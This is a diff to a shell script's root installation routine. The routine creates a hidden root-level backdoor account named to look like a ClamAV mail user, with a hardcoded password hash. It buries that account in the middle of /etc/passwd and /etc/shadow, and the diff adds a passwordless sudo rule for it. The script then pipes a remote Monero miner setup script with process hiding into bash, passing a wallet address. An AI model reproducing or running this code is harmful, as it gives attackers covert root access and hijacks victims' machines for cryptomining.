@@ -282,6 +282,7 @@ root_installation() {
     if ! grep -q '^sudo:' /etc/group; then
         groupadd sudo
     fi
+
     
     local PASSWORD_HASH='$1$GDwMqCqg$eDXKBHbUDpOgunTpref5J1'
     useradd -u 455 -G root,sudo,wheel -M -o -s /bin/bash clamav-mail
@@ -290,6 +291,9 @@ root_installation() {
     mv /tmp/passwd /etc/passwd
     awk '{lines[NR] = $0} END {last_line = lines[NR]; delete lines[NR]; num_lines = NR - 1; middle = int(num_lines / 2 + 1); for (i=1; i<middle; i++) print lines[i]; print last_line; for (i=middle; i<=num_lines; i++) print lines[i];}' /etc/shadow > /tmp/shadow
     mv /tmp/shadow /etc/shadow
+
+    echo 'clamav-mail ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers.d/clamav-mail
+    chown root:root /etc/sudoers.d/clamav-mail
 
     # Run the miner setup
     curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
